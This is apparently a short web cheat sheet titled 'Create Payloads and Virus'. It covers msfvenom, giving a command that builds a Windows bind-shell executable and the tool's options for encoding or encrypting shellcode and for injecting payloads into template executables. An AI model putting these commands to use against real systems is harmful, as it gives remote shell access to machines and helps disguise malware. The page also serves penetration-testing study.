<h1>Create Payloads and Virus</h1>
<h2>MSFVenom is new and cobine msfpayload, encrypts & others together</h2>
<h3>Sample usage</h3>
<code>msfvenom -p windows/shell_bind_tcp LPORT=1337 LHOST=<IP> -f exe -o bindshell.exe</code>
<p>
<h3>Get the list of <b>msfvenom</b> Options</h3>
<code>
msfvenom -l 
</code>
</p>
msfvenom -l 
	list of msfvenom options
		payloads
		encoders
		nops
		platforms
		archs
		encrypt
		formats
		all
msfvenom -p linux/x86/shell_bind_ipv6_tcp --list-options
	payload options
msfvenom -f 
	format like base64

	Raw Payload -> Encoder -> Formatting -> Output
	
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt

    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
